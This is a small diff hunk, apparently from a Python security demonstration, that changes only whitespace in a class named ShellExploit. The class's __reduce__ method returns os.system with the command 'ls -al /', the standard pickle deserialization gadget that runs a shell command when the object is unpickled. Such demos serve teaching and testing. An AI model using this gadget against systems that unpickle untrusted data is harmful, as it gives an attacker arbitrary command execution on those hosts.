@@ -12,7 +12,7 @@ import pickle
 
 class ShellExploit(object):
     """ A shell exploit class """
-    
+
     def __reduce__(self):
         # this will list contents of root / folder.
         return (os.system, ('ls -al /',))
